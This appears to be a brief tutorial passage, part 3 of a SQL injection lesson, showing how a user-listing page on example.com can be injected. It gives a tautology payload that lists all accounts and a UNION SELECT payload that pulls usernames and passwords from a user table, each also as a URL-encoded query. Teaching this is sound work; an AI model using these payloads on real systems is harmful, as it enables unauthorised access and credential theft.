# SQL Injection, part 3

Now we do have a public listing of users:

	/security/view.php

Where you can do SQL injection to view all accounts:

	Amy" OR 1="1

	https://example.com/security/view.php?q=Amy%22+OR+1%3D%221

Or to see the passwords:

	-" UNION SELECT username, password FROM user WHERE ""="

	https://example.com/security/view.php?q=-%22+UNION+SELECT+username%2C+password+FROM+user+WHERE+%22%22%3D%22
